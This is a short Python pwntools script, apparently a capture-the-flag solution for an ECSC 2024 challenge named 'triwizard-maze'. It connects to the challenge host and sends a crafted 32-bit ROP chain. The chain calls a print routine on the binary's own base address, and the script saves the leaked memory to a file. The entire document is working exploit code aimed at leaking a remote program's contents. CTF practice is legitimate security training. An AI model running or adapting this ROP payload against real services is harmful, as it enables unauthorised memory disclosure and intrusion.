from pwn import *

host = "triwizard-maze.challs.external.open.ecsc2024.it" 
port = 38202
io = remote(host, port)

bin_base = 0x13370000
print_add = 0x13371f2b

payload = p32(print_add)
payload += p32(0)
payload += p32(bin_base)
payload += p32(0xffffffff)

io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):", payload.ljust(1024))
io.recvline()
data = io.recvall()

with open("triwizard-maze", "wb") as elf:
    elf.write(data)
